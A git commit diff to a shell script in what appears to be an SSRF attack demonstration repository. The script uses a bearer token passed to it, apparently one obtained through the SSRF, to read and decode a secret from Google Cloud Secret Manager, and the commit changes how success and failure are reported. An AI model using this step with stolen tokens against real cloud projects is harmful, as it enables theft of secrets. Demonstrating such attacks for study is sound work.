ec6b5d861c9c7a8a183851e31c16b62444218bab
tobiasgrantner <tobias.grantner@gmail.com>
2024-10-08 11:52:41 +0200

    Access secret script printing proper message when successful but printing JSON response when unsuccessful

--- attacks/ssrf/scripts/access-secret.sh
+++ attacks/ssrf/scripts/access-secret.sh
@@ -1,5 +1,12 @@
-curl -s "https://secretmanager.googleapis.com/v1/projects/$PROJECT_ID/secrets/secret/versions/1:access" \
-    --header "authorization: Bearer $1" \
-    --header "content-type: application/json" |
-    jq -r '.payload.data' |
-    base64 -d
+response=$(
+    curl -s "https://secretmanager.googleapis.com/v1/projects/$PROJECT_ID/secrets/session-secret/versions/latest:access" \
+        --header "authorization: Bearer $1" \
+        --header "content-type: application/json" \
+        --fail-with-body
+) ||
+    (echo $response && exit 1) &&
+    echo Successfully retrieved secret value: $(
+        echo $response |
+            jq -r '.payload.data' |
+            base64 -d
+    )
